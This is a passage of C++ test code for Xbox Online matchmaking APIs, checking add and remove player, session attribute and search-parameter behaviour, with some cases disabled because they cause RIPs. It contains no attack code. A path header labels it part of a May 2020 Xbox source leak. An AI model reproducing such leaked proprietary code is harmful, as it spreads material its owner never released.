	hr = XOnlineMatchSessionCreate(SessionID, 1, GetBufferLenForUserInt() - 1, hEvent, &hMatch );
	
	xLog(hLog, XLL_INFO, "XOnlineMatchSessionCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionCreate failed unexpectedly");
	}

	hr = XOnlineMatchSessionRemovePlayer(hMatch, USER1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionRemovePlayer returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSessionRemovePlayer failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineMatchSessionRemovePlayer returned success but should have failed!");
	}

	END_TESTCASE();
	CLEANUP_TASK(hMatch);


/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Add player to a task that has already been sent");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	hr = XOnlineMatchSessionCreate(SessionID, 1, GetBufferLenForUserInt(), hEvent, &hMatch );
	
	xLog(hLog, XLL_INFO, "XOnlineMatchSessionCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionCreate failed unexpectedly");
	}

	hr = XOnlineMatchSessionSend(hMatch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSend failed unexpectedly");
	}

	hr = XOnlineMatchSessionAddPlayer(hMatch, USER1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionAddPlayer returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSessionAddPlayer failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineMatchSessionAddPlayer returned success but should have failed!");
	}

	END_TESTCASE();
	CLEANUP_TASK(hMatch);
*/

/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Remove player from a task that has already been sent");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	hr = XOnlineMatchSessionCreate(SessionID, 1, GetBufferLenForUserInt(), hEvent, &hMatch );
	
	xLog(hLog, XLL_INFO, "XOnlineMatchSessionCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionCreate failed unexpectedly");
	}

	hr = XOnlineMatchSessionSend(hMatch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSend failed unexpectedly");
	}

	hr = XOnlineMatchSessionRemovePlayer(hMatch, USER1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionRemovePlayer returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSessionRemovePlayer failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineMatchSessionRemovePlayer returned success but should have failed!");
	}

	PASS_TESTCASE("Test passed");

	END_TESTCASE();
	CLEANUP_TASK(hMatch);
*/

	// -----------------------------------------------------------------
	START_TESTCASE("Verify that add player is cleared after successful send completion");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	hr = XOnlineMatchSessionCreate(SessionID, 1, GetBufferLenForUserInt(), hEvent, &hMatch );
	
	xLog(hLog, XLL_INFO, "XOnlineMatchSessionCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionCreate failed unexpectedly");
	}

	hr = XOnlineMatchSessionAddPlayer(hMatch, USER1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionAddPlayer returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionAddPlayer failed unexpectedly");
	}

	hr = XOnlineMatchSessionSend(hMatch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hMatch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);

	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session creation failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session creation didn't complete within 30 seconds");
	}

	hr = XOnlineMatchSessionSetInt(hMatch, GLOBALUSERINT_ID1, USER1, INT1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSetInt returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSetInt failed unexpectedly");
	}

	PASS_TESTCASE("Test passed");

	END_TESTCASE();
	CLEANUP_TASK(hMatch);



	// -----------------------------------------------------------------
	START_TESTCASE("Verify that remove player is cleared after successful send completion");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));

	hr = XOnlineMatchSessionCreate(SessionID, 1, GetBufferLenForUserInt(), hEvent, &hMatch );
	
	xLog(hLog, XLL_INFO, "XOnlineMatchSessionCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionCreate failed unexpectedly");
	}

	hr = XOnlineMatchSessionRemovePlayer(hMatch, USER1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionRemovePlayer returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionRemovePlayer failed unexpectedly");
	}

	hr = XOnlineMatchSessionSend(hMatch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hMatch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);

	xLog(hLog, XLL_INFO, "PollTaskUntilComplete  returned 0x%08x", hr);
	if(hr != XMATCH_E_INVALID_PLAYER)
	{
		FAIL_TESTCASE("Session creation returned success but should have failed");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session creation didn't complete within 30 seconds");
	}

/* API behavior is such that if a request fails, the attributes inside it aren't removed... makes sense

	hr = XOnlineMatchSessionSetInt(hMatch, GLOBALUSERINT_ID1, USER1, INT1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSetInt returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSetInt failed unexpectedly");
	}
*/

	PASS_TESTCASE("Test passed");

	END_TESTCASE();
	CLEANUP_TASK(hMatch);


	// -----------------------------------------------------------------
	START_TESTCASE("Verify that add player is cleared after second successful send completion");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	hr = XOnlineMatchSessionCreate(SessionID, 1, GetBufferLenForUserInt(), hEvent, &hMatch );
	
	xLog(hLog, XLL_INFO, "XOnlineMatchSessionCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionCreate failed unexpectedly");
	}

	hr = XOnlineMatchSessionSend(hMatch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hMatch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);

	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session creation failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session creation didn't complete within 30 seconds");
	}

	hr = XOnlineMatchSessionAddPlayer(hMatch, USER1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionAddPlayer returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionAddPlayer failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hMatch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);

	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session creation failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session creation didn't complete within 30 seconds");
	}

	hr = XOnlineMatchSessionSetInt(hMatch, GLOBALUSERINT_ID1, USER1, INT1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSetInt returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSetInt failed unexpectedly");
	}

	PASS_TESTCASE("Test passed");

	END_TESTCASE();
	CLEANUP_TASK(hMatch);



	// -----------------------------------------------------------------
	START_TESTCASE("Verify that remove player is cleared after second successful send completion");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	hr = XOnlineMatchSessionCreate(SessionID, 1, GetBufferLenForUserInt(), hEvent, &hMatch );
	
	xLog(hLog, XLL_INFO, "XOnlineMatchSessionCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionCreate failed unexpectedly");
	}

	hr = XOnlineMatchSessionSend(hMatch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hMatch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);

	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session creation failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session creation didn't complete within 30 seconds");
	}

	hr = XOnlineMatchSessionRemovePlayer(hMatch, USER1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionRemovePlayer returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionRemovePlayer failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hMatch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);

	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session creation failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session creation didn't complete within 30 seconds");
	}

	hr = XOnlineMatchSessionSetInt(hMatch, GLOBALUSERINT_ID1, USER1, INT1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSetInt returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSetInt failed unexpectedly");
	}

	PASS_TESTCASE("Test passed");

	END_TESTCASE();
	CLEANUP_TASK(hMatch);



	// -----------------------------------------------------------------
	START_TESTCASE("Call add twice for same player");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	hr = XOnlineMatchSessionCreate(SessionID, 1, GetBufferLenForUserInt(), hEvent, &hMatch );
	
	xLog(hLog, XLL_INFO, "XOnlineMatchSessionCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionCreate failed unexpectedly");
	}

	hr = XOnlineMatchSessionAddPlayer(hMatch, USER1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionAddPlayer returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionAddPlayer failed unexpectedly");
	}

	hr = XOnlineMatchSessionAddPlayer(hMatch, USER1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionAddPlayer returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionAddPlayer failed unexpectedly");
	}

	hr = XOnlineMatchSessionSend(hMatch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hMatch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);

	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session creation failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session creation didn't complete within 30 seconds");
	}

	PASS_TESTCASE("Test passed");

	END_TESTCASE();
	CLEANUP_TASK(hMatch);



	// -----------------------------------------------------------------
	START_TESTCASE("Call remove twice for same player");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	hr = XOnlineMatchSessionCreate(SessionID, 1, GetBufferLenForUserInt(), hEvent, &hMatch );
	
	xLog(hLog, XLL_INFO, "XOnlineMatchSessionCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionCreate failed unexpectedly");
	}

	hr = XOnlineMatchSessionRemovePlayer(hMatch, USER1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionRemovePlayer returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionRemovePlayer failed unexpectedly");
	}

	hr = XOnlineMatchSessionRemovePlayer(hMatch, USER1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionRemovePlayer returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionRemovePlayer failed unexpectedly");
	}

	hr = XOnlineMatchSessionSend(hMatch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hMatch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);

	xLog(hLog, XLL_INFO, "PollTaskUntilComplete  returned 0x%08x", hr);
	if(!FAILED(hr))
	{
		FAIL_TESTCASE("Session creation returned success but should have failed");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session creation didn't complete within 30 seconds");
	}

	PASS_TESTCASE("Test passed");

	END_TESTCASE();
	CLEANUP_TASK(hMatch);


	// -----------------------------------------------------------------
	START_TESTCASE("Call add when remove is already present for player");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	hr = XOnlineMatchSessionCreate(SessionID, 1, GetBufferLenForUserInt(), hEvent, &hMatch );
	
	xLog(hLog, XLL_INFO, "XOnlineMatchSessionCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionCreate failed unexpectedly");
	}

	hr = XOnlineMatchSessionRemovePlayer(hMatch, USER1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionRemovePlayer returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionRemovePlayer failed unexpectedly");
	}

	hr = XOnlineMatchSessionAddPlayer(hMatch, USER1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionAddPlayer returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionAddPlayer failed unexpectedly");
	}

	hr = XOnlineMatchSessionSend(hMatch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hMatch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);

	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session creation failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session creation didn't complete within 30 seconds");
	}

	PASS_TESTCASE("Test passed");

	END_TESTCASE();
	CLEANUP_TASK(hMatch);



	// -----------------------------------------------------------------
	START_TESTCASE("Call remove when add is already present for player");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	hr = XOnlineMatchSessionCreate(SessionID, 1, GetBufferLenForUserInt(), hEvent, &hMatch );
	
	xLog(hLog, XLL_INFO, "XOnlineMatchSessionCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionCreate failed unexpectedly");
	}

	hr = XOnlineMatchSessionAddPlayer(hMatch, USER1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionAddPlayer returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionAddPlayer failed unexpectedly");
	}

	hr = XOnlineMatchSessionRemovePlayer(hMatch, USER1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionRemovePlayer returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionRemovePlayer failed unexpectedly");
	}

	hr = XOnlineMatchSessionSend(hMatch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hMatch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);

	xLog(hLog, XLL_INFO, "PollTaskUntilComplete  returned 0x%08x", hr);
	if(!FAILED(hr))
	{
		FAIL_TESTCASE("Session creation returned success but should have failed");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session creation didn't complete within 30 seconds");
	}

	PASS_TESTCASE("Test passed");

	END_TESTCASE();
	CLEANUP_TASK(hMatch);


/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Call to add a player via XOnlineMatchSessionSetInt");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	hr = XOnlineMatchSessionCreate(SessionID, 1, GetBufferLenForUserInt() * 1, hEvent, &hMatch );
	
	xLog(hLog, XLL_INFO, "XOnlineMatchSessionCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionCreate failed unexpectedly");
	}

	hr = XOnlineMatchSessionSetInt(hMatch, XMATCHUSERINT_ID1, USER1, INT1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSetInt returned 0x%08x", hr);
	if(!FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSetInt allowed us to add a player");
	}

	PASS_TESTCASE("Test passed");

	END_TESTCASE();
	CLEANUP_TASK(hMatch);
*/


	// -----------------------------------------------------------------
	START_TESTCASE("Call remove when add and a user attribute are already present for player");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	hr = XOnlineMatchSessionCreate(SessionID, 2, GetBufferLenForUserInt() * 2, hEvent, &hMatch );
	
	xLog(hLog, XLL_INFO, "XOnlineMatchSessionCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionCreate failed unexpectedly");
	}

	hr = XOnlineMatchSessionAddPlayer(hMatch, USER1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionAddPlayer returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionAddPlayer failed unexpectedly");
	}

	hr = XOnlineMatchSessionSetInt(hMatch, GLOBALUSERINT_ID1, USER1, INT1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSetInt returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSetInt failed unexpectedly");
	}

	hr = XOnlineMatchSessionRemovePlayer(hMatch, USER1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionRemovePlayer returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionRemovePlayer failed unexpectedly");
	}

	hr = XOnlineMatchSessionSend(hMatch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hMatch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);

	xLog(hLog, XLL_INFO, "PollTaskUntilComplete  returned 0x%08x", hr);
	if(!FAILED(hr))
	{
		FAIL_TESTCASE("Session creation returned success but should have failed");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session creation didn't complete within 30 seconds");
	}

	PASS_TESTCASE("Test passed");

	END_TESTCASE();
	CLEANUP_TASK(hMatch);


	// -----------------------------------------------------------------
	START_TESTCASE("Add user attribute for a player that is already being removed");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	hr = XOnlineMatchSessionCreate(SessionID, 2, GetBufferLenForUserInt() * 2, hEvent, &hMatch );
	
	xLog(hLog, XLL_INFO, "XOnlineMatchSessionCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionCreate failed unexpectedly");
	}

	hr = XOnlineMatchSessionRemovePlayer(hMatch, USER1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionRemovePlayer returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionRemovePlayer failed unexpectedly");
	}

	hr = XOnlineMatchSessionSetInt(hMatch, GLOBALUSERINT_ID1, USER1, INT1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSetInt returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSetInt failed unexpectedly");
	}

	hr = XOnlineMatchSessionSend(hMatch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hMatch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);

	xLog(hLog, XLL_INFO, "PollTaskUntilComplete  returned 0x%08x", hr);
	if(!FAILED(hr))
	{
		FAIL_TESTCASE("Session creation returned success but should have failed");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session creation didn't complete within 30 seconds");
	}

	PASS_TESTCASE("Test passed");

	END_TESTCASE();
	CLEANUP_TASK(hMatch);

Exit:
	if(hEvent)
		CloseHandle(hEvent);

	if(!fCompleted && hMatch)
		XOnlineTaskClose(hMatch);

	return hr;
} // XMatchTest_AddRemovePlayers


} // namespace XMatchTestNamespace
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\xmatch\core\appendparam.cpp ===
//==================================================================================
// Includes
//==================================================================================
#include "xmatchtest.h"

using namespace XMatchTestNamespace;

namespace XMatchTestNamespace {

//==================================================================================
// Prototypes
//==================================================================================
HRESULT XMatchTest_AppendParams(HANDLE hLog);

//==================================================================================
// XMatchTest_AppendParams
//----------------------------------------------------------------------------------
//
// Description: Contains test cases for appending parameters to search requests via
//   the Xbox Matchmaking APIs
//
// Arguments:
//	HANDLE hLog		Handle to logging subsystem
//
// Returns: S_OK if the act of running the test was successful (not whether the
//			test itself was successful), the error code otherwise.
//==================================================================================
HRESULT XMatchTest_AppendParams(HANDLE hLog, XONLINETASK_HANDLE hLogon)
{
	PXMATCH_SEARCHRESULT pSearchResult = NULL;
	XONLINETASK_HANDLE hSearch = NULL;
	XNKID SessionID;
	ATTRIBUTE AttributeTest[4];
	HRESULT hr = E_FAIL;
    HANDLE hEvent = NULL;
    DWORD dwPollCounter = 0, dwResultCounter = 0;
	BOOL fCompleted = FALSE, fRet = FALSE, fDone = FALSE;

	memset(&SessionID, 0, sizeof(SessionID));

	hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if(!hEvent)
		goto Exit;

/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Append integer parameter with NULL task handle");
	// -----------------------------------------------------------------

	hr = XOnlineMatchSearchAppendInt(NULL, INT1);
	
	xLog(hLog, XLL_INFO, "XOnlineMatchSearchAppendInt returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSearchAppendInt failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineMatchSearchAppendInt returned success but should have failed!");
	}

	END_TESTCASE();
*/


/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Append integer when no parameter slots are available");
	// -----------------------------------------------------------------
	
	hr = XOnlineMatchSearchCreate(INTPARAM_INDEX, 10, 0, 0, sizeof(XMATCH_SEARCHRESULT) + 500, hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}

	hr = XOnlineMatchSearchAppendInt(hSearch, INT1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchAppendInt returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSearchAppendInt failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineMatchSearchAppendInt returned success but should have failed!");
	}

	END_TESTCASE();
	CLEANUP_TASK(hSearch);
*/


	// -----------------------------------------------------------------
	START_TESTCASE("Append integer when there isn't enough space available");
	// -----------------------------------------------------------------
	
	hr = XOnlineMatchSearchCreate(INTPARAM_INDEX, 10, 1, 3, sizeof(XMATCH_SEARCHRESULT) + 500, hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}
	
	hr = XOnlineMatchSearchAppendInt(hSearch, INT1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchAppendInt returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSearchAppendInt failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineMatchSearchAppendInt returned success but should have failed!");
	}

	END_TESTCASE();
	CLEANUP_TASK(hSearch);



	// -----------------------------------------------------------------
	START_TESTCASE("Append an integer attribute when there is exactly enough space");
	// -----------------------------------------------------------------

	AttributeTest[0].dwAttributeID = GLOBALINT_ID1;
	AttributeTest[0].Value.qwValue = INT1;
	AttributeTest[0].qwUserID = 0;
	AttributeTest[1].dwAttributeID = GLOBALSTR_ID1;
	AttributeTest[1].Value.pvValue = (VOID *) STRING1;
	AttributeTest[1].qwUserID = 0;
	AttributeTest[2].dwAttributeID = GLOBALBLB_ID1;
	AttributeTest[2].Value.pvValue = (VOID *) BLOB1;
	AttributeTest[2].qwUserID = 0;

	memset(&SessionID, 0, sizeof(SessionID));
	if(!CreateSession(10, 10, AttributeTest, 3, &SessionID))
	{
		FAIL_TESTCASE("Couldn't create session to search for");
	}

	hr = XOnlineMatchSearchCreate(INTPARAM_INDEX, 10, 1, GetBufferLenForInt(), sizeof(XMATCH_SEARCHRESULT) + 200, hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned success!");
	
	hr = XOnlineMatchSearchAppendInt(hSearch, INT1);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("Couldn't add integer to search request!");
	}

	hr = XOnlineMatchSearchSend(hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchSend returned 0x%08x", hr);
	if (FAILED(hr))
	{
		hSearch = NULL;
		FAIL_TESTCASE("XOnlineMatchSearchSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hSearch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);

	xLog(hLog, XLL_INFO, "PollTaskUntilComplete returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session search failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session search didn't complete within 30 seconds");
	}

	PASS_TESTCASE("Search completed successfully");

	
	END_TESTCASE();
	CLEANUP_TASK(hSearch);



/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Try to append integer to a search that has already been sent");
	// -----------------------------------------------------------------

	hr = XOnlineMatchSearchCreate(INTPARAM_INDEX, 10, 1, GetBufferLenForInt(), sizeof(XMATCH_SEARCHRESULT) + 200, hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}

	hr = XOnlineMatchSearchSend(hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchSend returned 0x%08x", hr);
	if (FAILED(hr))
	{
		hSearch = NULL;
		FAIL_TESTCASE("XOnlineMatchSearchSend failed unexpectedly");
	}

	hr = XOnlineMatchSearchAppendInt(hSearch, INT1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchAppendInt returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSearchAppendInt failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineMatchSearchAppendInt returned success but should have failed!");
	}
	
	END_TESTCASE();
	CLEANUP_TASK(hSearch);
*/

/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Append string parameter with NULL task handle");
	// -----------------------------------------------------------------

	hr = XOnlineMatchSearchAppendString(NULL, STRING1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchAppendString returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSearchAppendString failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineMatchSearchAppendString returned success but should have failed!");
	}

	END_TESTCASE();
*/


/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Append string when no parameter slots are available");
	// -----------------------------------------------------------------
	
